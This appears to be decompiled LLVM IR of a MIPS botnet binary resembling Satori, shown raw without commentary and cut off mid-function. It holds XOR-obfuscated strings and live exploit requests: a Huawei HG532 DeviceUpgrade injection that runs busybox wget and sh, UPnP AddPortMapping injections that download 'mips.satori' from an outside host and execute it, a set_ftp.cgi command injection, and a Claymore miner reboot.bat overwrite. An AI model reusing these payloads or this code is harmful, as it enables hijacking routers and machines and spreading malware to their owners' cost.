source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%sockaddr = type { i32, [14 x i8] }
%rlimit = type { i32, i32 }
%tms = type { i32, i32, i32, i32 }
%timespec = type { i32, i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%_TYPEDEF_sigset_t = type { [1 x i32] }
%stat = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32 }

@v0 = internal unnamed_addr global i32 0
@v1 = internal unnamed_addr global i32 0
@a0 = internal unnamed_addr global i32 0
@a1 = internal unnamed_addr global i32 0
@a2 = internal unnamed_addr global i32 0
@a3 = internal unnamed_addr global i32 0
@s0 = internal unnamed_addr global i32 0
@s1 = internal unnamed_addr global i32 0
@s2 = internal unnamed_addr global i32 0
@s3 = internal unnamed_addr global i32 0
@s6 = internal unnamed_addr global i32 0
@s7 = internal unnamed_addr global i32 0
@t9 = internal unnamed_addr global i32 0
@gp = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ra = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_449a6c.1 = local_unnamed_addr global i32 0
@global_var_449a78.2 = local_unnamed_addr global i32 4521984
@global_var_4498bc.4 = global i32 0
@global_var_4498d0.5 = local_unnamed_addr global i32* @global_var_4498bc.4
@global_var_4498d4.6 = global i32 -1
@global_var_449c40.7 = local_unnamed_addr global i32 0
@global_var_449a7c.8 = local_unnamed_addr global i32 4259840
@global_var_449b20.9 = local_unnamed_addr global i32 0
@global_var_449d44.10 = global i32 0
@global_var_449b28.11 = local_unnamed_addr global i32 0
@global_var_449d60.12 = global i32 0
@global_var_449b58.13 = local_unnamed_addr global i32* @global_var_449d60.12
@global_var_449cb8.14 = local_unnamed_addr global i32 4219392
@global_var_449d64.15 = global i32 0
@global_var_449c14.16 = local_unnamed_addr global i32* @global_var_449d64.15
@global_var_449bec.17 = local_unnamed_addr global i32 4210592
@global_var_449c20.18 = local_unnamed_addr global i32 4218992
@global_var_449c24.19 = local_unnamed_addr global i32 4195776
@global_var_449c0c.20 = local_unnamed_addr global i32 4195868
@global_var_408350.21 = constant i32 1953775231
@global_var_408368.22 = constant i32 1932670822
@global_var_408380.23 = constant i32 1969760375
@global_var_408388.24 = constant i32 1719085162
@global_var_408390.25 = constant i32 2137139298
@global_var_408398.26 = constant i32 1969760375
@global_var_4083a8.27 = constant i32 1661413473
@global_var_4083b0.28 = constant i32 1681080118
@global_var_4083c4.29 = constant i32 1968137073
@global_var_4083d0.30 = constant i32 1684824434
@global_var_4083dc.31 = constant i32 2138204514
@global_var_4083ec.32 = constant i32 1617257838
@global_var_4083f8.33 = constant i32 1414747976
@global_var_408408.34 = constant i32 1969513329
@global_var_408414.35 = constant i32 1650882160
@global_var_408420.36 = constant i32 1684235877
@global_var_408438.37 = constant i32 1684235877
@global_var_40845c.38 = constant i32 2000041069
@global_var_408474.39 = constant i32 808283442
@global_var_408480.40 = constant i32 1632330347
@global_var_40848c.41 = constant i32 1684420192
@global_var_4084a4.42 = constant i32 1430283854
@global_var_4084b0.43 = constant i32 1953657897
@global_var_4084c4.44 = constant i32 1969760375
@global_var_4084d4.45 = constant i32 1953656873
@global_var_4084e8.46 = constant i32 1953658665
@global_var_4084fc.47 = constant [51 x i8] c"%|cn=%+7%'tmihwu%d%=)5%7'+j%sbho%c%=njbiXubuheshz%\00"
@global_var_408530.48 = constant [53 x i8] c"%|cn=%+7%'tmihwu%d%=)5%7'+j%sbho%c%=njbiXub`tsfs6sz%\00"
@global_var_405830.50 = constant i32 684261384
@global_var_449bac.51 = local_unnamed_addr global i32 4211004
@global_var_449c3c.52 = local_unnamed_addr global i32 4210504
@global_var_449bb8.53 = local_unnamed_addr global i32 4195024
@global_var_449ce0.54 = local_unnamed_addr global i32 4195684
@global_var_400bac.55 = constant i32 -1883504624
@global_var_449b4c.56 = local_unnamed_addr global i32 4214896
@global_var_400bc4.57 = constant i32 4231201
@global_var_449d04.58 = local_unnamed_addr global i32 4213732
@global_var_449b78.59 = local_unnamed_addr global i32 4210636
@global_var_449b1c.60 = local_unnamed_addr global i32 4214240
@global_var_449c68.61 = local_unnamed_addr global i32 4195352
@global_var_449bc4.62 = local_unnamed_addr global i32 4216064
@global_var_400e5c.63 = constant i32 -1883504624
@global_var_400f1c.64 = constant i32 -1883504624
@global_var_449cc4.65 = local_unnamed_addr global i32 4215152
@global_var_400f6c.66 = constant i32 -1883504624
@global_var_400fe4.67 = constant i32 -1883504624
@global_var_449cd8.68 = local_unnamed_addr global i32 4210736
@global_var_401048.69 = constant i32 -1883504624
@global_var_4010c0.70 = constant i32 -1883504624
@1 = constant i32 47
@global_var_404288.73 = constant i32 604569632
@global_var_4011a4.74 = constant i32 -1883504624
@global_var_449c50.75 = local_unnamed_addr global i32 4214800
@global_var_449b2c.76 = local_unnamed_addr global i32 4215760
@global_var_449cb0.77 = local_unnamed_addr global i32 4221360
@global_var_449ca4.78 = local_unnamed_addr global i32 4218896
@global_var_449c34.79 = local_unnamed_addr global i32 4218768
@global_var_449b24.80 = local_unnamed_addr global i32 4213888
@global_var_449cf0 = external local_unnamed_addr global i32
@global_var_449dd0.82 = global i32 0
@global_var_449b6c.83 = local_unnamed_addr global i32 4216736
@global_var_449c48.84 = local_unnamed_addr global i32 4217936
@global_var_449c04.85 = local_unnamed_addr global i32 4218352
@global_var_449d10.86 = local_unnamed_addr global i32 4218032
@global_var_449ccc.87 = local_unnamed_addr global i32 4196912
@global_var_449a80.88 = local_unnamed_addr global i32 4194304
@global_var_449c10.89 = local_unnamed_addr global i32 4215568
@global_var_449b18.90 = local_unnamed_addr global i32 4196048
@global_var_449c38.91 = local_unnamed_addr global i32 4214144
@global_var_449cec.92 = local_unnamed_addr global i32 4211980
@global_var_449c54.93 = local_unnamed_addr global i32 4215664
@global_var_408840.94 = constant i32 10
@global_var_449b68.95 = local_unnamed_addr global i32 4221120
@global_var_449c28.96 = local_unnamed_addr global i32 4202104
@global_var_449c00.97 = local_unnamed_addr global i32 4214336
@global_var_449b30.98 = local_unnamed_addr global i32 4215376
@global_var_408648.99 = constant [7 x i8] c"mipsel\00"
@global_var_449c74.100 = local_unnamed_addr global i32 4201832
@global_var_449c88.101 = local_unnamed_addr global i32 4204776
@global_var_449b88.102 = local_unnamed_addr global i32 4209964
@global_var_4018dc.103 = constant i32 4227105
@global_var_4019f0.105 = constant i32 4200481
@global_var_449c80.106 = local_unnamed_addr global i32 4218672
@global_var_4498d8.107 = local_unnamed_addr global i32 -1
@global_var_449b90.108 = local_unnamed_addr global i32 4218224
@global_var_408650.109 = constant i32 16777216
@global_var_449d14.110 = local_unnamed_addr global i32 4218448
@global_var_401d08.111 = constant i32 -1750728672
@global_var_449d70.112 = local_unnamed_addr global i32 0
@global_var_449d7c.113 = local_unnamed_addr global i32 0
@global_var_449d74.114 = local_unnamed_addr global i32 0
@global_var_449d78.115 = local_unnamed_addr global i32 0
@global_var_449bc8.116 = local_unnamed_addr global i32 4215472
@global_var_449ce4.117 = local_unnamed_addr global i32 4214512
@global_var_449bcc.118 = local_unnamed_addr global i32 4214608
@global_var_449b40.119 = local_unnamed_addr global i32 4216768
@global_var_449bb0.120 = local_unnamed_addr global i32 4211884
@global_var_449c5c.121 = local_unnamed_addr global i32 4219888
@global_var_449ca0.122 = local_unnamed_addr global i32 4215248
@global_var_449cac.123 = local_unnamed_addr global i32 4218544
@global_var_449cf8.124 = local_unnamed_addr global i32 4217024
@global_var_449d80.125 = global i32 0
@global_var_449bdc.126 = local_unnamed_addr global i32* @global_var_449d80.125
@global_var_402550.127 = constant i32 -1883504624
@global_var_449c84.128 = local_unnamed_addr global i32 4211240
@global_var_449b14.129 = local_unnamed_addr global i32 4220080
@global_var_449d18.130 = local_unnamed_addr global i32 4214432
@global_var_449d24.131 = local_unnamed_addr global i32 4221936
@global_var_449cc8.132 = local_unnamed_addr global i32 4201924
@global_var_449d20.133 = local_unnamed_addr global i32 4202280
@global_var_408660.134 = constant [26 x i8] c"EthDcrMiner64.exe -epool \00"
@global_var_449cbc.135 = local_unnamed_addr global i32 4210540
@global_var_40867c.136 = constant [8 x i8] c" -ewal \00"
@global_var_408678.137 = constant i32 32
@global_var_408684.138 = constant [27 x i8] c"-mode 1 -mport 3333 -mpsw \00"
@global_var_402c6c.139 = constant i32 -1883504608
@global_var_402ca4.140 = constant i32 -1883504608
@global_var_449b8c.141 = local_unnamed_addr global i32 4213648
@global_var_4086a0.142 = constant [3 x i8] c"%x\00"
@global_var_4086a4.143 = constant [71 x i8] c"{\22id\22:0,\22jsonrpc\22:\222.0\22,\22method\22:\22miner_file\22,\22params\22:[\22reboot.bat\22,\22\00"
@global_var_4086ec.144 = constant [5 x i8] c"\22]}\22\00"
@global_var_449d88.145 = local_unnamed_addr global i32 0
@global_var_449d8c.146 = local_unnamed_addr global i32 0
@global_var_4086f4.147 = constant [62 x i8] c"bdoh,*b,%p`bs,ossw=([(6?2)15)6??)??(e(`,*H,(sjw()d%,9,(sjw()a\00"
@global_var_402dc8.148 = constant i32 -1883504608
@global_var_402de4.149 = constant i32 -1883504608
@global_var_408734.150 = constant [32 x i8] c"bdoh,*b,%to,(sjw()d%,99,(sjw()a\00"
@global_var_402e00.151 = constant i32 -1883504608
@global_var_408754.152 = constant [11 x i8] c"to,(sjw()a\00"
@global_var_402eb0.153 = constant i32 -1883504608
@global_var_4032ec.154 = constant i32 -1883504608
@global_var_408774.155 = constant [10 x i8] c"loginuser\00"
@global_var_40331c.156 = constant i32 -1883504608
@global_var_40960c.157 = constant [9 x i8] c"\0A\0D=\22 \0A\0D\22\00"
@global_var_4033f8.158 = constant i32 -1883504608
@global_var_449cb4.159 = local_unnamed_addr global i32 4210780
@global_var_408780.160 = constant i32 59
@global_var_408784.161 = constant [27 x i8] c"GET /set_ftp.cgi?loginuse=\00"
@global_var_4087a0.162 = constant [11 x i8] c"&loginpas=\00"
@global_var_4087ac.163 = constant [88 x i8] c"&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28\00"
@global_var_408804.164 = constant [17 x i8] c"%29 HTTP/1.0\0D\0A\0D\0A\00"
@global_var_403658.165 = constant i32 -1883504608
@global_var_408818.166 = constant [27 x i8] c"GET /ftptest.cgi?loginuse=\00"
@global_var_408834.167 = constant [14 x i8] c" HTTP/1.0\0D\0A\0D\0A\00"
@global_var_449d84.168 = global i32 0
@global_var_449b3c.169 = local_unnamed_addr global i32* @global_var_449d84.168
@global_var_449b3d.170 = global i32 -1073724259
@global_var_408844.171 = constant [860 x i8] c"POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\0D\0AHost: 127.0.0.1:37215\0D\0AUser-Agent: Hello-World\0D\0AContent-Length: 413\0D\0AConnection: keep-alive\0D\0AAccept: */*\0D\0AAccept-Encoding: gzip, deflate\0D\0AAuthorization: Digest username=\22dslf-config\22, realm=\22HuaweiHomeGateway\22, nonce=\2288645cefb1f9ede0e336e3569d75ee30\22, uri=\22/ctrlt/DeviceUpgrade_1\22, response=\223612f843a42db38f48f59d2a3597e19c\22, algorithm=\22MD5\22, qop=\22auth\22, nc=00000001, cnonce=\22248d1a2560100669\22\0D\0A\0D\0A<?xml version=\221.0\22 ?>\0D\0A    <s:Envelope xmlns:s=\22http://schemas.xmlsoap.org/soap/envelope/\22 s:encodingStyle=\22http://schemas.xmlsoap.org/soap/encoding/\22>\0D\0A    <s:Body><u:Upgrade xmlns:u=\22urn:schemas-upnp-org:service:WANPPPConnection:1\22>\0D\0A    <NewStatusURL>$(/bin/busybox wget -g %d.%d.%d.%d -l /tmp/.f -r /g/h;sh /tmp/.f)</NewStatusURL>\0D\0A<NewDownloadURL></NewDownloadURL>\0D\0A</u:Upgrade>\0D\0A    </s:Body>\0D\0A    </s:Envelope>\0D\0A\0D\0A\00"
@global_var_408ba0.172 = constant [3 x i8] c"\0D\0A\00"
@global_var_408ba4.173 = constant [14 x i8] c"\22error\22: null\00"
@global_var_40387c.174 = constant i32 -1883504608
@global_var_408bb4.175 = constant [852 x i8] c"POST /picdesc.xml HTTP/1.1\0D\0AHost: 127.0.0.1:52869\0D\0AContent-Length: 620\0D\0AAccept-Encoding: gzip, deflate\0D\0ASOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\0D\0AAccept: */*\0D\0AUser-Agent: Hello-World\0D\0AConnection: keep-alive\0D\0A\0D\0A<?xml version=\221.0\22 ?><s:Envelope xmlns:s=\22http://schemas.xmlsoap.org/soap/envelope/\22 s:encodingStyle=\22http://schemas.xmlsoap.org/soap/encoding/\22><s:Body><u:AddPortMapping xmlns:u=\22urn:schemas-upnp-org:service:WANIPConnection:1\22><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;cp $SHELL %s;>%s`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\0D\0A\0D\0A\00"
@global_var_408f08.176 = constant [880 x i8] c"POST /picdesc.xml HTTP/1.1\0D\0AHost: 127.0.0.1:52869\0D\0AContent-Length: 642\0D\0AAccept-Encoding: gzip, deflate\0D\0ASOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\0D\0AAccept: */*\0D\0AUser-Agent: Hello-World\0D\0AConnection: keep-alive\0D\0A\0D\0A<?xml version=\221.0\22 ?><s:Envelope xmlns:s=\22http://schemas.xmlsoap.org/soap/envelope/\22 s:encodingStyle=\22http://schemas.xmlsoap.org/soap/encoding/\22><s:Body><u:AddPortMapping xmlns:u=\22urn:schemas-upnp-org:service:WANIPConnection:1\22><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;wget http://%d.%d.%d.%d/mips.satori -O -> %s`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\0D\0A\0D\0A\00"
@global_var_403ba8.177 = constant i32 -1883504608
@global_var_409278.178 = constant [852 x i8] c"POST /picdesc.xml HTTP/1.1\0D\0AHost: 127.0.0.1:52869\0D\0AContent-Length: 620\0D\0AAccept-Encoding: gzip, deflate\0D\0ASOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\0D\0AAccept: */*\0D\0AUser-Agent: Hello-World\0D\0AConnection: keep-alive\0D\0A\0D\0A<?xml version=\221.0\22 ?><s:Envelope xmlns:s=\22http://schemas.xmlsoap.org/soap/envelope/\22 s:encodingStyle=\22http://schemas.xmlsoap.org/soap/encoding/\22><s:Body><u:AddPortMapping xmlns:u=\22urn:schemas-upnp-org:service:WANIPConnection:1\22><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;chmod +x %s;./%s`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\0D\0A\0D\0A\00"
@global_var_403cac.179 = constant i32 -1883504608
@global_var_449d90.180 = global i32 0
@global_var_449c7c.181 = local_unnamed_addr global i32* @global_var_449d90.180
@global_var_403d64.182 = constant i32 -1883504616
@global_var_449c6c.183 = local_unnamed_addr global i32 4217840
@global_var_449b98.184 = local_unnamed_addr global i32 4196880
@global_var_449b9c.185 = local_unnamed_addr global i32 4203732
@global_var_449b48.186 = local_unnamed_addr global i32 4209932
@global_var_449c1c.188 = local_unnamed_addr global i32 4215056
@global_var_449b10.189 = local_unnamed_addr global i32 4218128
@global_var_404a58.190 = constant i32 -1883504608
@global_var_404b44.191 = constant i32 -1883504608
@global_var_404bd0.192 = constant i32 -1883504624
@global_var_449bf8.193 = local_unnamed_addr global i32 4214032
@global_var_449c08.194 = local_unnamed_addr global i32 4214704
@global_var_449a84.195 = local_unnamed_addr global i32 4214896
@global_var_406e6c.197 = constant i32 65011720
@global_var_406e64.199 = constant i32 65011720
@global_var_449a88.202 = local_unnamed_addr global i32 4214240
@global_var_449b7c.203 = local_unnamed_addr global i32 4224240
@global_var_449a8c.204 = local_unnamed_addr global i32 4213888
@global_var_449cfc.206 = local_unnamed_addr global i32 4224384
@global_var_449df0.207 = global i32 0
@global_var_449b38.208 = local_unnamed_addr global i32* @global_var_449df0.207
@global_var_449c30.209 = local_unnamed_addr global i32 4226048
@global_var_407ea0.211 = constant i32 684195848
@global_var_409620.212 = constant i32 -311380
@global_var_449c64.213 = local_unnamed_addr global i32 4219288
@global_var_449be4.214 = local_unnamed_addr global i32 4219248
@global_var_449e20.215 = global i32 0
@global_var_449a90.216 = local_unnamed_addr global i32* @global_var_449e20.215
@global_var_449d28.217 = local_unnamed_addr global i32 4223728
@global_var_449da0.218 = global i32 0
@global_var_449ca8.219 = local_unnamed_addr global i32* @global_var_449da0.218
@global_var_449b5c.220 = local_unnamed_addr global i32 4220480
@global_var_4499f8.221 = global i32 256
@global_var_449a10.222 = global i32* @global_var_4499f8.221
@global_var_449c90.223 = local_unnamed_addr global i32** @global_var_449a10.222
@global_var_449b80 = external local_unnamed_addr global i32
@global_var_449ea0.226 = global i32 0
@global_var_449ba4.227 = local_unnamed_addr global i32* @global_var_449ea0.226
@global_var_449ce8.228 = local_unnamed_addr global i32 4225744
@global_var_449cd0.229 = local_unnamed_addr global i32 4220744
@global_var_4063c8.230 = constant i32 604176396
@global_var_406464.231 = constant i32 -1883504624
@global_var_449a20.233 = global i32 0
@global_var_449b94.234 = local_unnamed_addr global i32* @global_var_449a20.233
@global_var_449dc0.235 = global i32 0
@global_var_449a98.236 = local_unnamed_addr global i32* @global_var_449dc0.235
@global_var_449d0c.237 = local_unnamed_addr global i32 4222368
@global_var_449ba0.238 = local_unnamed_addr global i32 0
@global_var_449bbc.239 = local_unnamed_addr global i32 4224064
@global_var_449c44.240 = local_unnamed_addr global i32 4225888
@global_var_406ae4.241 = constant i32 -1883504624
@global_var_449c60.242 = local_unnamed_addr global i32 4225648
@global_var_406b2c.243 = constant i32 -1883504624
@global_var_406b4c.244 = constant i32 -1883504624
@global_var_406b94.245 = constant i32 -1883504624
@global_var_409640.246 = constant i32 -306684
@global_var_449d1c.248 = local_unnamed_addr global i32 4225328
@global_var_449d00.249 = local_unnamed_addr global i32 4224144
@global_var_449aa0 = external local_unnamed_addr global i32
@global_var_449de0.252 = global i32 0
@global_var_449aa8.253 = local_unnamed_addr global i32* @global_var_449de0.252
@global_var_4098a0.254 = constant [10 x i8] c"/dev/null\00"
@global_var_449bc0.255 = local_unnamed_addr global i32 4227040
@global_var_449de4.256 = local_unnamed_addr global i32 0
@global_var_449c2c.257 = local_unnamed_addr global i32 0
@global_var_449b64.258 = local_unnamed_addr global i32 0
@global_var_449cf4.259 = local_unnamed_addr global i32* @global_var_449dd0.82
@global_var_449dd4.260 = global i32 0
@global_var_449c8c.261 = local_unnamed_addr global i32* @global_var_449dd4.260
@global_var_449b54.262 = local_unnamed_addr global i32 4227472
@global_var_449aac.263 = local_unnamed_addr global i32 4222716
@global_var_449b44.264 = local_unnamed_addr global i32 4225376
@global_var_449b60.265 = local_unnamed_addr global i32 4225136
@global_var_449c78.266 = local_unnamed_addr global i32 4225232
@global_var_449bf4.267 = local_unnamed_addr global i32 4225040
@global_var_449bb4.268 = local_unnamed_addr global i32 0
@global_var_449ab4.269 = local_unnamed_addr global i32 4221120
@global_var_449bd4.270 = local_unnamed_addr global i32 4223968
@global_var_4073a8.271 = constant i32 -1885142960
@global_var_449bd0.272 = local_unnamed_addr global i32 4226432
@global_var_449b50.273 = local_unnamed_addr global i32 4224576
@global_var_449ab8.274 = local_unnamed_addr global i32 4217024
@global_var_449e10.275 = global i32 0
@global_var_449b74.276 = local_unnamed_addr global i32* @global_var_449e10.275
@global_var_449c4c.277 = local_unnamed_addr global i32 4227520
@global_var_407b38.278 = constant i32 -1883504624
@global_var_449a50.279 = global i32 0
@global_var_449e00.280 = local_unnamed_addr global i32 0
@global_var_449b34.281 = local_unnamed_addr global i32 4227632
@global_var_408180.282 = constant i32 16711693
@global_var_449d30.283 = global i32 0
@global_var_449bfc.284 = local_unnamed_addr global i32* @global_var_449d30.283
@global_var_449d34.285 = global i32 0
@global_var_449b70.286 = local_unnamed_addr global i32* @global_var_449d34.285
@global_var_449abc.287 = local_unnamed_addr global i32 4214512
@global_var_449ac0.288 = local_unnamed_addr global i32 4214800
@global_var_449d40.3 = local_unnamed_addr global i8 0
@global_var_449d6c.104 = local_unnamed_addr global i8 0
@global_var_449d94.187 = external local_unnamed_addr global i8*
@global_var_408568.71 = constant [2 x i8] c"/\00"

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_branch(i32) local_unnamed_addr

define i32 @function_400094() local_unnamed_addr {
entry:
  %v0_4000a8 = load i32, i32* @ra, align 4
  %v1_4000c4 = add i32 %v0_4000a8, 301512
  %v2_4000c4 = inttoptr i32 %v1_4000c4 to i32*
  %v3_4000c4 = load i32, i32* %v2_4000c4, align 4
  %v1_4000cc = add i32 %v3_4000c4, 476
  call void @__pseudo_call(i32 %v1_4000cc)
  %v3_4000f4 = load i32, i32* @global_var_449a6c.1, align 4
  %v1_4000fc = add i32 %v3_4000f4, -32128
  call void @__pseudo_call(i32 %v1_4000fc)
  %v4_400118 = load i32, i32* @v0, align 4
  ret i32 %v4_400118
}

define i32 @function_400120() local_unnamed_addr {
entry:
  %v3_400148 = load i8, i8* @global_var_449d40.3, align 1
  %v4_400148 = zext i8 %v3_400148 to i32
  %v1_400150 = icmp eq i8 %v3_400148, 0
  br i1 %v1_400150, label %dec_label_pc_400154, label %dec_label_pc_4001c8

dec_label_pc_400154:                              ; preds = %entry
  %v3_400160 = load i32, i32* bitcast (i32** @global_var_4498d0.5 to i32*), align 4
  %v1_400170 = icmp eq i32 %v3_400160, 0
  br i1 %v1_400170, label %dec_label_pc_400198, label %dec_label_pc_400178

dec_label_pc_400178:                              ; preds = %dec_label_pc_400154, %dec_label_pc_400178
  %v0_400178 = phi i32 [ %v3_400180, %dec_label_pc_400178 ], [ %v3_400160, %dec_label_pc_400154 ]
  store i32 ptrtoint (i32* @global_var_4498d4.6 to i32), i32* bitcast (i32** @global_var_4498d0.5 to i32*), align 4
  call void @__pseudo_call(i32 %v0_400178)
  %v3_400180 = load i32, i32* bitcast (i32** @global_var_4498d0.5 to i32*), align 4
  %v1_400190 = icmp eq i32 %v3_400180, 0
  br i1 %v1_400190, label %dec_label_pc_400198, label %dec_label_pc_400178

dec_label_pc_400198:                              ; preds = %dec_label_pc_400178, %dec_label_pc_400154
  %v3_400198 = load i32, i32* @global_var_449c40.7, align 4
  %v1_4001a0 = icmp eq i32 %v3_400198, 0
  br i1 %v1_4001a0, label %dec_label_pc_4001c4, label %dec_label_pc_4001a4

dec_label_pc_4001a4:                              ; preds = %dec_label_pc_400198
  %v3_4001b4 = call i32 @unknown_0()
  br label %dec_label_pc_4001c4

dec_label_pc_4001c4:                              ; preds = %dec_label_pc_400198, %dec_label_pc_4001a4
  store i8 1, i8* @global_var_449d40.3, align 1
  br label %dec_label_pc_4001c8

dec_label_pc_4001c8:                              ; preds = %entry, %dec_label_pc_4001c4
  %v4_4001d4 = phi i32 [ %v4_400148, %entry ], [ 1, %dec_label_pc_4001c4 ]
  ret i32 %v4_4001d4

; uselistorder directives
  uselistorder i32 %v3_400180, { 1, 0 }
  uselistorder i8* @global_var_449d40.3, { 1, 0 }
  uselistorder label %dec_label_pc_4001c8, { 1, 0 }
  uselistorder label %dec_label_pc_4001c4, { 1, 0 }
  uselistorder label %dec_label_pc_400178, { 1, 0 }
}

define i32 @function_4001dc() local_unnamed_addr {
dec_label_pc_4001dc:
  %v3_4001fc = load i32, i32* @global_var_449b20.9, align 4
  %v1_400208 = icmp eq i32 %v3_4001fc, 0
  br i1 %v1_400208, label %dec_label_pc_400220, label %dec_label_pc_40020c

dec_label_pc_40020c:                              ; preds = %dec_label_pc_4001dc
  %v1_400210 = call i32 @unknown_0()
  br label %dec_label_pc_400220

dec_label_pc_400220:                              ; preds = %dec_label_pc_4001dc, %dec_label_pc_40020c
  %v3_400220 = load i32, i32* @global_var_449a78.2, align 4
  %v3_400224 = load i32, i32* @global_var_449b28.11, align 4
  %v1_400228 = add i32 %v3_400220, -26432
  %v2_400228 = inttoptr i32 %v1_400228 to i32*
  %v3_400228 = load i32, i32* %v2_400228, align 4
  %v1_400230 = icmp eq i32 %v3_400228, 0
  %v1_400238 = icmp eq i32 %v3_400224, 0
  %or.cond = or i1 %v1_400238, %v1_400230
  br i1 %or.cond, label %dec_label_pc_400220.dec_label_pc_40024c_crit_edge, label %dec_label_pc_40023c

dec_label_pc_400220.dec_label_pc_40024c_crit_edge: ; preds = %dec_label_pc_400220
  br label %dec_label_pc_40024c

dec_label_pc_40023c:                              ; preds = %dec_label_pc_400220
  %v4_400244 = call i32 @unknown_0()
  br label %dec_label_pc_40024c

dec_label_pc_40024c:                              ; preds = %dec_label_pc_400220.dec_label_pc_40024c_crit_edge, %dec_label_pc_40023c
  %v4_400254 = phi i32 [ %v3_400228, %dec_label_pc_400220.dec_label_pc_40024c_crit_edge ], [ %v4_400244, %dec_label_pc_40023c ]
  ret i32 %v4_400254

; uselistorder directives
  uselistorder label %dec_label_pc_40024c, { 1, 0 }
  uselistorder label %dec_label_pc_400220, { 1, 0 }
}

define i32 @entry_point(i32 %arg1) local_unnamed_addr {
entry:
  %v1_400274 = load i32, i32* @ra, align 4
  %v1_4002ac = add i32 %v1_400274, 301444
  %v2_4002ac = inttoptr i32 %v1_4002ac to i32*
  %v3_4002ac = load i32, i32* %v2_4002ac, align 4
  call void @__pseudo_call(i32 %v3_4002ac)
  %v0_4002cc = load i32, i32* @v0, align 4
  ret i32 %v0_4002cc
}

define i32 @function_4002d0(i32 %arg1) local_unnamed_addr {
dec_label_pc_4002d0:
  %a0.global-to-local = alloca i32, align 4
  %a1.global-to-local = alloca i32, align 4
  %a2.global-to-local = alloca i32, align 4
  %t0.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v3_4002dc = load i32, i32* bitcast (i32** @global_var_449b58.13 to i32*), align 4
  store i32 %v3_4002dc, i32* %v0.global-to-local, align 4
  store i32 %v3_4002dc, i32* %a1.global-to-local, align 4
  %v1_4002ec = urem i32 %arg1, 256
  store i32 %v1_4002ec, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_4002f0

dec_label_pc_4002f0:                              ; preds = %dec_label_pc_4003fc, %dec_label_pc_4002d0
  %v0_400308 = phi i32 [ %v3_4003fc, %dec_label_pc_4003fc ], [ %v3_4002dc, %dec_label_pc_4002d0 ]
  %v1_4002f0 = inttoptr i32 %v0_400308 to i32*
  %v2_4002f0 = load i32, i32* %v1_4002f0, align 4
  store i32 %v2_4002f0, i32* %v0.global-to-local, align 4
  %v1_4002f8 = icmp sgt i32 %v2_4002f0, 0
  %v2_400300 = icmp eq i32 %v1_4002ec, %v2_4002f0
  %or.cond = and i1 %v1_4002f8, %v2_400300
  br i1 %or.cond, label %dec_label_pc_400304, label %dec_label_pc_4003fc

dec_label_pc_400304:                              ; preds = %dec_label_pc_4002f0
  %v1_400308 = add i32 %v0_400308, 10
  %v2_400308 = inttoptr i32 %v1_400308 to i8*
  %v3_400308 = load i8, i8* %v2_400308, align 1
  %v4_400308 = sext i8 %v3_400308 to i32
  store i32 %v4_400308, i32* %v0.global-to-local, align 4
  %v1_400310 = icmp eq i8 %v3_400308, 0
  store i32 0, i32* %a0.global-to-local, align 4
  br i1 %v1_400310, label %dec_label_pc_400410, label %dec_label_pc_400314

dec_label_pc_400314:                              ; preds = %dec_label_pc_400304
  store i32 -19, i32* %t0.global-to-local, align 4
  store i32 -22, i32* @a3, align 4
  store i32 -34, i32* %a2.global-to-local, align 4
  br label %dec_label_pc_400328

dec_label_pc_400328:                              ; preds = %dec_label_pc_400328.dec_label_pc_400328_crit_edge, %dec_label_pc_400314
  %v1_40033c = phi i32 [ %v1_40033c.pre, %dec_label_pc_400328.dec_label_pc_400328_crit_edge ], [ -19, %dec_label_pc_400314 ]
  %v0_400330 = phi i32 [ %v0_4003a0, %dec_label_pc_400328.dec_label_pc_400328_crit_edge ], [ 0, %dec_label_pc_400314 ]
  %v0_400328 = phi i32 [ %v0_400398, %dec_label_pc_400328.dec_label_pc_400328_crit_edge ], [ %v0_400308, %dec_label_pc_400314 ]
  %v1_400328 = add i32 %v0_400328, 4
  %v2_400328 = inttoptr i32 %v1_400328 to i32*
  %v3_400328 = load i32, i32* %v2_400328, align 4
  %v2_400330 = add i32 %v3_400328, %v0_400330
  %v1_400334 = inttoptr i32 %v2_400330 to i8*
  %v2_400334 = load i8, i8* %v1_400334, align 1
  %v3_400334 = zext i8 %v2_400334 to i32
  %v2_40033c = xor i32 %v3_400334, %v1_40033c
  store i32 %v2_40033c, i32* %v0.global-to-local, align 4
  %v1_400340 = trunc i32 %v2_40033c to i8
  store i8 %v1_400340, i8* %v1_400334, align 1
  %v0_400344 = load i32, i32* %a1.global-to-local, align 4
  %v1_400344 = add i32 %v0_400344, 4
  %v2_400344 = inttoptr i32 %v1_400344 to i32*
  %v3_400344 = load i32, i32* %v2_400344, align 4
